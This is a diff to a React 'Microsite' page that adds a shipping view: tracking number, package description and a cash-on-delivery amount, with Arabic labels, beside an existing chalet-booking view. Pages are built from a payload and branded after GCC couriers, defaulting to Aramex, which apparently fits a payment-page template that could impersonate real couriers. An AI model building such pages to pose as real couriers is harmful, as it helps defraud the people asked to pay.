@@ -1,3 +1,4 @@
+import React from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -16,6 +17,7 @@ import {
   Sparkles,
   Package,
   Truck,
+  Hash,
 } from "lucide-react";
 
 const Microsite = () => {
@@ -49,6 +51,15 @@ const Microsite = () => {
   const serviceName = payload.service_name || payload.chalet_name;
   const serviceKey = payload.service_key || 'aramex';
   const serviceBranding = getServiceBranding(serviceKey);
+  
+  // Update URL to include service information for better SEO
+  React.useEffect(() => {
+    const currentUrl = new URL(window.location.href);
+    if (isShipping && serviceKey && !currentUrl.searchParams.has('service')) {
+      currentUrl.searchParams.set('service', serviceKey);
+      window.history.replaceState({}, '', currentUrl.toString());
+    }
+  }, [isShipping, serviceKey]);
   
   // Get service description from gccShippingServices
   const allServices = Object.values(gccShippingServices).flat();
@@ -142,66 +153,114 @@ const Microsite = () => {
               
               {/* Details Grid */}
               <div className="grid md:grid-cols-2 gap-6 mb-8">
-                <div className="flex items-start gap-3">
-                  <MapPin className="w-5 h-5 text-primary mt-1" />
-                  <div>
-                    <p className="font-semibold mb-1">الموقع</p>
-                    <p className="text-muted-foreground text-sm">
-                      {payload.chalet_name}
-                    </p>
-                  </div>
-                </div>
-                
-                <div className="flex items-start gap-3">
-                  <Users className="w-5 h-5 text-primary mt-1" />
-                  <div>
-                    <p className="font-semibold mb-1">عدد الضيوف</p>
-                    <p className="text-muted-foreground text-sm">
-                      {payload.guest_count} ضيف
-                    </p>
-                  </div>
-                </div>
-                
-                <div className="flex items-start gap-3">
-                  <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
-                  <div>
-                    <p className="font-semibold mb-1">المدة</p>
-                    <p className="text-muted-foreground text-sm">
-                      {payload.nights} ليلة
-                    </p>
-                  </div>
-                </div>
-                
-                <div className="flex items-start gap-3">
-                  <CreditCard className="w-5 h-5 text-primary mt-1" />
-                  <div>
-                    <p className="font-semibold mb-1">السعر / الليلة</p>
-                    <p className="text-muted-foreground text-sm">
-                      {formatCurrency(payload.price_per_night, countryData.currency)}
-                    </p>
-                  </div>
-                </div>
+                {isShipping ? (
+                  <>
+                    <div className="flex items-start gap-3">
+                      <Hash className="w-5 h-5 text-primary mt-1" />
+                      <div>
+                        <p className="font-semibold mb-1">رقم الشحنة</p>
+                        <p className="text-muted-foreground text-sm">
+                          {payload.tracking_number}
+                        </p>
+                      </div>
+                    </div>
+                    
+                    
+                    <div className="flex items-start gap-3">
+                      <Truck className="w-5 h-5 text-primary mt-1" />
+                      <div>
+                        <p className="font-semibold mb-1">وصف الطرد</p>
+                        <p className="text-muted-foreground text-sm">
+                          {payload.package_description || 'غير محدد'}
+                        </p>
+                      </div>
+                    </div>
+                    
+                    <div className="flex items-start gap-3">
+                      <CreditCard className="w-5 h-5 text-primary mt-1" />
+                      <div>
+                        <p className="font-semibold mb-1">مبلغ الدفع</p>
+                        <p className="text-muted-foreground text-sm">
+                          {formatCurrency(payload.cod_amount, countryData.currency)}
+                        </p>
+                      </div>
+                    </div>
+                  </>
+                ) : (
+                  <>
+                    <div className="flex items-start gap-3">
+                      <MapPin className="w-5 h-5 text-primary mt-1" />
+                      <div>
+                        <p className="font-semibold mb-1">الموقع</p>
+                        <p className="text-muted-foreground text-sm">
+                          {payload.chalet_name}
+                        </p>
+                      </div>
+                    </div>
+                    
+                    <div className="flex items-start gap-3">
+                      <Users className="w-5 h-5 text-primary mt-1" />
+                      <div>
+                        <p className="font-semibold mb-1">عدد الضيوف</p>
+                        <p className="text-muted-foreground text-sm">
+                          {payload.guest_count} ضيف
+                        </p>
+                      </div>
+                    </div>
+                    
+                    <div className="flex items-start gap-3">
+                      <CheckCircle2 className="w-5 h-5 text-primary mt-1" />
+                      <div>
+                        <p className="font-semibold mb-1">المدة</p>
+                        <p className="text-muted-foreground text-sm">
+                          {payload.nights} ليلة
+                        </p>
+                      </div>
+                    </div>
+                    
+                    <div className="flex items-start gap-3">
+                      <CreditCard className="w-5 h-5 text-primary mt-1" />
+                      <div>
+                        <p className="font-semibold mb-1">السعر / الليلة</p>
+                        <p className="text-muted-foreground text-sm">
+                          {formatCurrency(payload.price_per_night, countryData.currency)}
+                        </p>
+                      </div>
+                    </div>
+                  </>
+                )}
               </div>
               
               {/* Total Amount */}
               <div className="bg-gradient-primary p-6 rounded-xl text-primary-foreground mb-6">
                 <p className="text-sm mb-2 opacity-90">المبلغ الإجمالي</p>
                 <p className="text-5xl font-bold mb-2">
-                  {formatCurrency(payload.total_amount, countryData.currency)}
+                  {formatCurrency(isShipping ? payload.cod_amount : payload.total_amount, countryData.currency)}
                 </p>
                 <p className="text-sm opacity-80">
-                  {payload.price_per_night} × {payload.nights} ليلة
+                  {isShipping ? 'مبلغ الدفع عند الاستلام' : `${payload.price_per_night} × ${payload.nights} ليلة`}
                 </p>
               </div>
               
               {/* Terms */}
               <div className="bg-secondary/30 p-4 rounded-lg mb-6">
-                <h3 className="font-bold mb-2">شروط الحجز</h3>
+                <h3 className="font-bold mb-2">{isShipping ? 'شروط الشحن' : 'شروط الحجز'}</h3>
                 <ul className="text-sm text-muted-foreground space-y-1">
-                  <li>• الدفع بالكامل مطلوب لتأكيد الحجز</li>
-                  <li>• سياسة الإلغاء: استرداد 50% قبل 7 أيام</li>
-                  <li>• الحد الأقصى للضيوف يجب احترامه</li>
-                  <li>• التدخين ممنوع داخل الشاليه</li>
+                  {isShipping ? (
+                    <>
+                      <li>• الدفع مطلوب عند استلام الطرد</li>
+                      <li>• تأكد من صحة العنوان قبل الدفع</li>
+                      <li>• الطرد محمي ومؤمن عليه</li>
+                      <li>• يمكن تتبع الطرد في أي وقت</li>
+                    </>
+                  ) : (
+                    <>
+                      <li>• الدفع بالكامل مطلوب لتأكيد الحجز</li>
+                      <li>• سياسة الإلغاء: استرداد 50% قبل 7 أيام</li>
+                      <li>• الحد الأقصى للضيوف يجب احترامه</li>
+                      <li>• التدخين ممنوع داخل الشاليه</li>
+                    </>
+                  )}
                 </ul>
               </div>
               
